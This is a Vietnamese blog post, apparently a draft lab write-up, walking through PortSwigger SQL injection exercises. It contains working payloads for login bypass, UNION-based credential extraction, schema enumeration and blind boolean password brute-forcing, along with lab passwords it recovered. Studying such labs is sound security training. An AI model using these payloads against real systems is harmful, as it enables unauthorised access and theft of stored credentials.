---
title: SQL injection
published: 2025-08-11
description: Tìm hiểu về SQL injection.
tags: [sqli, security]
category: PortSwigger
draft: true
cover: '/post-imgs/sqli/sqli.png'
---

# SQL injection là gì?
**SQL injection** (SQLi) là một lỗ hổng bảo mật ứng dụng cho phép kẻ tấn công can thiệp vào các truy vấn để trích xuất hoặc thay đổi dữ liệu trái phép nhắm đến database.

Một cuộc tấn công SQLi thành công sẽ dẫn đến việc truy cập trái phép vào các thông tin nhạy cảm.

# Cách phát hiện SQLi
Để phát hiện SQLi bạn sẽ thường chèn các giá trị khác nhau vào payload để quan sát phản hồi của ứng dụng.

* **Ký tự ` ' `**

Ví dụ:

```sql
GET /product?id=1'
```

``Nếu ứng dụng báo lỗi kiểu SQL syntax error, khả năng cao là dính SQLi.``

* **Thử payload để kết quả không đổi và một payload làm thay đổi kết quả.**

Ví dụ 

```sql
GET /product?id=1 AND 1=1 --> vẫn trả về kết quả ban đầu
GET /product?id=1 AND 1=2 --> trả về kết quả khác
```

``Nếu có sự khác biệt giữa hai phản hồi trên thì có khả năng cao ứng dụng dính SQLi.``

* **Thử payload điều kiện Boolean**

Ví dụ:
```sql
GET /product?id=1 OR 1=1 --> luôn đúng
GET /product?id=1 OR 1=2 --> luôn sai
```

``Nếu có sự khác biệt giữa hai phản hồi trên thì có khả năng cao ứng dụng dính SQLi.``

* **Thử payload để gây độ trễ thời gian**

Ví dụ:
```sql
' OR SLEEP(10)--
```

``Nếu phản hồi chậm đúng số giây → khả năng cao là lỗ hổng tồn tại.``

* **Thử payload OAST (Out-of-Band Application Security Testing)**


``Gửi payload khiến server kết nối ra ngoài (ví dụ về Burp Collaborator).``

``Nếu có kết nối đến server của bạn → lỗ hổng xác nhận.``

> SQLi có thể xảy ra ở bất kỳ vị trí nào và trong các loại truy vấn khác.

## Lấy dữ liệu ẩn
Là cách khai thác lỗ hổng SQLi để xem các dữ liệu mà ứng dụng cố tình không hiển thị.

Bằng cách thay đổi các truy vấn gốc để trả về thêm các kết quả bổ sung.
### Ví dụ
**Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

Khi người dùng thực hiện lọc `category` với giá trị là `Gifts`:

```
https://example.net/filter?category=Gifts
```

<p align="center"><b>🠋 truy vấn SQL 🠋</b></p>

```sql
SELECT * FROM products WHERE category='Gifts' AND released = 1;
```

Với `AND released = 1` là các sản phẩm đã được phát hành còn `AND released = 0` sẽ là các sản phẩm chưa được phát hành.  

Nếu thay đổi URL với dạng:

```
https://example.net/filter?category=Gifts'-- 
```

<p align="center"><b>🠋 truy vấn SQL 🠋</b></p>

```sql
SELECT * FROM products WHERE category='Gifts'-- ' AND released = 1;
```

Với truy vấn này tất cả sản phẩm trong `category='Gifts'` sẽ được hiển thị tất cả dù chưa phát hành do `-- ` được chèn vào đã comment điều kiện `AND released = 1`.

Với một trường hợp khác:

```
https://example.net/filter?category=Gifts' OR 1=1 -- 
```

<p align="center"><b>🠋 truy vấn SQL 🠋</b></p>

```sql
SELECT * FROM products WHERE category='Gifts' OR 1=1 -- ' AND released = 1;
```

Trong truy vấn này điều kiện `WHERE category='Gifts' OR 1=1` nếu một điều kiện OR là đúng, thì toàn bộ điều kiện sẽ đúng cho mọi dòng → không lọc gì nữa.

Cùng lúc đó `-- ` cũng tiến hành comment diều kiện `AND released = 1`. Nên cuối cùng tất cả các sản phẩm của `products` sẽ được hiển thị toàn bộ.

---

### Lật đổ logic ứng dụng
Cùng là một lỗ hổng SQLi thay đổi các truy vấn gốc giống [Lấy dữ liệu ẩn](#lấy-dữ-liệu-ẩn) nhưng [Lật đổ logic ứng dụng](#lật-đổ-logic-ứng-dụng) lại can thiệp vào logic của ứng dụng để đạt được mục đích.

### Ví dụ
**Lab: SQL injection vulnerability allowing login bypass**

Trong phần đăng nhập với nội dung:

```yaml
Username: user1
Password: abc123
```
<p align="center"><b>🠋 truy vấn SQL 🠋</b></p>

```sql
SELECT * FROM users WHERE username = 'user1' AND password = 'abc123'
```
Để đăng nhập thì điều kiện `WHERE username = 'user1' AND password = 'abc123'` sẽ phải đúng `username` và `password`.

Sau đó ta chỉ cần sửa lại:

```yaml
Username: administrator'-- 
Password: abc123
```

<p align="center"><b>🠋 truy vấn SQL 🠋</b></p>

```sql
SELECT * FROM users WHERE username = 'administrator'-- ' AND password = 'abc123'
```
Là ta có thể đăng nhập vào tài khoản `administrator` và bỏ qua điều kiện mật khẩu.

# Tấn công SQLi sử dụng mệnh đề UNION

Nếu ứng dụng bị SQL Injection và hiển thị kết quả truy vấn, kẻ tấn công có thể dùng UNION để ghép truy vấn khác và lấy dữ liệu từ bảng khác.

Để sử dụng được `UNION` phải đáp ứng được 2 yêu cầu:

* Các truy vấn riêng lẻ phải trả về cùng số một cột.

* Các loại dư liệu trong mỗi cột phải tương thích giữa các truy vấn riêng lẻ.

## Điều kiện để thực hiện được một cuộc tấn công SQLi với UNION

### Xác định có bao nhiêu cột trả về trong truy vấn gốc

Có 2 cách để xác định số lượng cột trong truy vấn gốc:

* ORDER BY: Tăng dần số cột (ORDER BY 1, ORDER BY 2...) cho đến khi lỗi → biết số cột.

* UNION SELECT NULL: Thử số NULL khác nhau, khi khớp số cột → payload chạy OK.

### Ví dụ
**Lab: SQL injection UNION attack, determining the number of columns returned by the query**
Cách 1: ORDER BY

```http
GET /filter?category=Accessories'ORDER BY 1--  //200 OK
GET /filter?category=Accessories'ORDER BY 2--  //200 OK
GET /filter?category=Accessories'ORDER BY 3--  //200 OK
GET /filter?category=Accessories'ORDER BY 4--  //500 Internal Server Error
```

Suy ra số lượng cột ở truy vấn gốc là `3`.

Cách 2: UNION SELECT NULL

```http
GET /filter?category=Accessories'UNION SELECT NULL--                 //500 Internal Server Error
GET /filter?category=Accessories'UNION SELECT NULL,NULL--            //500 Internal Server Error
GET /filter?category=Accessories'UNION SELECT NULL,NULL,NULL--       //200 OK
GET /filter?category=Accessories'UNION SELECT NULL,NULL,NULL,NULL--  //500 Internal Server Error
```

Suy ra số lượng cột ở truy vấn gốc là `3`.

### Cột nào trong truy vấn gốc có kiểu dữ liệu phù hợp để chứa dữ liệu từ truy vấn chèn thêm

Sau khi xác định được số cột trả về từ truy vấn gốc ta sẽ tiến hành chèn `'string'` vào từng cột (các cột khác để `NULL`) → nếu hiện `'string'` và không lỗi → cột đó chứa hoặc chấp nhận dữ liệu chuỗi, có thể dùng để lấy dữ liệu text.

### Ví dụ
**Lab: SQL injection UNION attack, finding a column containing text**

Sau khi tiến hành xác định số cột của truy vấn gốc ta sẽ biết được số cột gốc là `3`.

 ```http
 GET /filter?category=Accessories'UNION SELECT NULL,NULL,NULL--       //200 OK
Tiến hành chèn 'abc' vào các cột NULL.
GET /filter?category=Accessories'UNION SELECT 'abc',NULL,NULL--       //500 Internal Server Error
GET /filter?category=Accessories'UNION SELECT NULL,'abc',NULL--       //200 OK
GET /filter?category=Accessories'UNION SELECT NULL,NULL,'abc'--       //500 Internal Server Error
 ```

 Suy ra tại cột `2` chứa hoặc chấp nhận dữ liệu chuỗi, có thể dùng để lấy dữ liệu text.

 ## Thực hiện một cuộc tấn công SQLi đầy dủ với UNION
**Lab: SQL injection UNION attack, retrieving data from other tables**

* Xác định số cột trả về trong truy vấn gốc

 ```http
GET /filter?category=Accessories' UNION SELECT NULL--            //500 Internal Server Error
GET /filter?category=Accessories' UNION SELECT NULL,NULL--       //200 OK
GET /filter?category=Accessories' UNION SELECT NULL,NULL,NULL--  //500 Internal Server Error
 ```

 Số cột bằng `2`.

* Xác định kiểu dữ liệu của các cột

 ```http
GET /filter?category=Accessories' UNION SELECT 'abc',NULL--       //200 OK
GET /filter?category=Accessories' UNION SELECT NULL,'abc'--       //200 OK
```

Cả `2` cột đều chứa hoặc chấp nhận dữ liệu chuỗi.

* Tấn công để truy xuất dữ liệu `username`, `password` từ bảng `users`.

```http
GET /filter?category=Accessories' UNION SELECT username,password FROM users-- 
```

Và ta có được thông tin đăng nhập `username: administrator`, `password: ho06o0hazcl4cqupdtaf`.

## Lấy nhiều giá trị trong một cột

Nếu truy vấn chỉ trả về 1 cột, hãy nối nhiều giá trị lại bằng toán tử nối chuỗi và thêm ký tự phân tách (vd. ~) để phân biệt.

You can concatenate together multiple strings to make a single string. 

```sql
Oracle    	'foo'||'bar'
Microsoft 	'foo'+'bar'
PostgreSQL 	'foo'||'bar'
MySQL     	'foo' 'bar' [Lưu ý khoảng trống giữa hai chuỗi]
            CONCAT('foo','bar')
```

### Ví dụ

**Lab: SQL injection UNION attack, retrieving multiple values in a single column**

* Xác định số cột trả về trong truy vấn gốc

 ```http
GET /filter?category=Accessories' UNION SELECT NULL--            //500 Internal Server Error
GET /filter?category=Accessories' UNION SELECT NULL,NULL--       //200 OK
GET /filter?category=Accessories' UNION SELECT NULL,NULL,NULL--  //500 Internal Server Error
 ```

 Số cột bằng `2`.

* Xác định kiểu dữ liệu của các cột

 ```http
GET /filter?category=Accessories' UNION SELECT 'abc',NULL--       //500 Internal Server Error
GET /filter?category=Accessories' UNION SELECT NULL,'abc'--       //200 OK
```

Cột `2` chứa hoặc chấp nhận dữ liệu chuỗi.

* Tấn công để truy xuất dữ liệu `username`, `password` từ bảng `users` bằng cách nối 2 chuỗi `username` và `password` thành một và hiển thị trong cột `2`.

```http
GET /filter?category=Accessories' UNION SELECT NULL,username||'~'||password FROM users-- 
```

Và ta có được thông tin đăng nhập `administrator~8117jw3c5i6exwn3xtv2`.

# Kiểm tra cơ sở dữ liệu trong các cuộc tấn công SQLi

Để khai thác lỗ hổng SQL injection, thường cần tìm thông tin về cơ sở dữ liệu, bao gồm:

* Loại và phiên bản của phần mềm cơ sở dữ liệu.

* Các bảng và cột mà cơ sở dữ liệu đang chứa.

## Truy vấn loại cơ sở dữ liệu và phiên bản.

```sql
Microsoft, MySQL → SELECT @@version
Oracle           → SELECT * FROM v$version
PostgreSQL       → SELECT version()
```

### Ví dụ
**Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft**
* Xác định số cột trả về trong truy vấn gốc

 ```http
GET /filter?category=Accessories' UNION SELECT NULL#            //500 Internal Server Error
GET /filter?category=Accessories' UNION SELECT NULL,NULL#       //200 OK
GET /filter?category=Accessories' UNION SELECT NULL,NULL,NULL#  //500 Internal Server Error
//Sử dung # thay cho --  do ứng dụng đã fix -- 
 ```

 Số cột bằng `2`.

* Xác định kiểu dữ liệu của các cột

 ```http
GET /filter?category=Accessories' UNION SELECT 'abc',NULL#       //200 OK
GET /filter?category=Accessories' UNION SELECT NULL,'abc'#       //200 OK
```

Cả `2` cột đều chứa hoặc chấp nhận dữ liệu chuỗi.

* Tấn công để truy xuất dữ liệu về kiểu và phiên bản database

 ```http
GET /filter?category=Accessories' UNION SELECT @@version,NULL#       //200 OK
```

Kết quả đạt được là `8.0.42-0ubuntu0.20.04.1`.

## Liệt kê nội dung của cơ sở dữ liệu

Hầu hết các loại cơ sở dữ liệu (trừ Oracle) đều có một tập hợp các view gọi là information schema. View này cung cấp thông tin về cơ sở dữ liệu.

* Truy vấn liệt kê các bảng trong cơ sở dữ liệu sẽ có đầu ra trả về như sau:

TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME   | TABLE_TYPE
--------------|--------------|--------------|--------------
MyDatabase    | dbo          | Products     | BASE TABLE
MyDatabase    | dbo          | Users        | BASE TABLE
MyDatabase    | dbo          | Feedback     | BASE TABLE

* Truy vấn liệt kê các cột trong bảng riêng lẻ sẽ có đầu ra trả về như sau:

TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME   | COLUMN_NAME  | DATA_TYPE
--------------|--------------|--------------|--------------|--------------
MyDatabase    | dbo          | Users        | UserId       | int
MyDatabase    | dbo          | Users        | Username     | varchar
MyDatabase    | dbo          | Users        | Password     | varchar

```sql
Oracle 	    SELECT * FROM all_tables
            SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
Microsoft 	SELECT * FROM information_schema.tables
            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
PostgreSQL 	SELECT * FROM information_schema.tables
            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
MySQL     	SELECT * FROM information_schema.tables
            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

## Ví dụ
**Lab: SQL injection attack, listing the database contents on non-Oracle databases**

* Xác định số cột trả về trong truy vấn gốc

 ```http
GET /filter?category=Accessories' UNION SELECT NULL--            //500 Internal Server Error
GET /filter?category=Accessories' UNION SELECT NULL,NULL--       //200 OK
GET /filter?category=Accessories' UNION SELECT NULL,NULL,NULL--  //500 Internal Server Error
 ```

 Số cột bằng `2`.

* Xác định kiểu dữ liệu của các cột

 ```http
GET /filter?category=Accessories' UNION SELECT 'abc',NULL--       //200 OK
GET /filter?category=Accessories' UNION SELECT NULL,'abc'--       //200 OK
```

Cả `2` cột chứa hoặc chấp nhận dữ liệu chuỗi.

* Xác định `TABLE_NAME` của cơ sở dữ liệu.

```sql
GET /filter?category=' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables-- 
```
Tìm được `TABLE_NAME: users_fdpkec`

* Xác định `COLUMN_NAME` trong `TABLE_NAME: users_fdpkec`

```sql
GET /filter?category=' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE TABLE_NAME = 'users_fdpkec'-- 
```

Tìm được `COLUMN_NAME: email, password_qhnrxp, username_dcllzy`.

* Lấy các giá trị `COLUMN_NAME: password_qhnrxp, username_dcllzy` từ `TABLE_NAME: users_fdpkec`

```sql
GET /filter?category=' UNION SELECT username_dcllzy,password_qhnrxp FROM users_fdpkec-- 
```

Ta tìm được thông tin đăng nhập `username_dcllzy: administrator, password_qhnrxp: k5kvgcc1savepgo282j8`.

# SQLi mù
SQLi mù là khi ứng dụng bị SQLi nhưng không hiển thị kết quả hoặc lỗi từ CSDL.

* UNION… không hiệu quả vì không thấy dữ liệu trả về.

* Vẫn khai thác được nhưng phải dùng kỹ thuật khác (vd. boolean-based, time-based).

## Khai thác SQL SQL mù bằng cách kích hoạt các phản ứng có điều kiện
Khai thác SQL SQL mù bằng cách kích hoạt các phản ứng có điều kiện là kỹ thuật SQLi mù mà kẻ tấn công dựa vào sự khác biệt trong phản hồi của ứng dụng khi điều kiện trong truy vấn là ĐÚNG hoặc SAI để suy luận dữ liệu.

**Lab: Blind SQL injection with conditional responses**
Giả xử ta có một chuỗi `Cookie: TrackingId=abcdefghijklm` thì ta sẽ có câu truy vấn như sau:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'abcdefghijklm'
```

Tiến hành khai thác có điều kiện với `TrackingId`.

```http
Cookie: TrackingId=abcdefghijklm' AND 1=1-- //Điều kiện đúng ==> Kết quả trả về có "Welcome back"
Cookie: TrackingId=abcdefghijklm' AND 1=2-- //Điều kiện sai ==> Kết quả trả về không có "Welcome back"
```
Suy ra nếu thay điều kiện `1=1` bằng một dữ liệu hữu ích cho viết tấn công thì ta sẽ biết được nếu dữ liệu đúng thì sẽ có `'Welcome back'` và ngược lại thì không.

```http
Cookie: TrackingId=abcdefghijklm' AND SUBSTRING((SELECT username FROM users WHERE username='administrator'),1,13)='administrator
==> Có trả về "Welcome back"
```

Suy ra có tồn tại `username='administrator'`.

Dò độ dài của `password`

```http
Cookie: TrackingId=aPB8inszaqNX0Lkj'  AND (SELECT  LENGTH(password) FROM users WHERE username='administrator')=19-- //Welcome back
Cookie: TrackingId=aPB8inszaqNX0Lkj'  AND (SELECT  LENGTH(password) FROM users WHERE username='administrator')=20-- //Welcome back
Cookie: TrackingId=aPB8inszaqNX0Lkj'  AND (SELECT  LENGTH(password) FROM users WHERE username='administrator')=21-- //Không có Welcome back
```
Suy ra độ dài của mật khẩu sẽ là `20`.

Dò từ vị trí 1 - 20 của password với các khả năng 1-9, a-z.

```http
Cookie: TrackingId=abcdefghijklm' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
...
Cookie: TrackingId=abcdefghijklm' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='z

Cookie: TrackingId=abcdefghijklm' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='1
...
Cookie: TrackingId=abcdefghijklm' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='9
```

Đối với từng vị trí từ `1-20` nếu trường hợp nào có `'Welcome back'` thì đó chính là giá trị của vị trí đó trong `password`.

(Có thể sử dụng Burp Suite Intruder hoặc viết một script để brute force password)
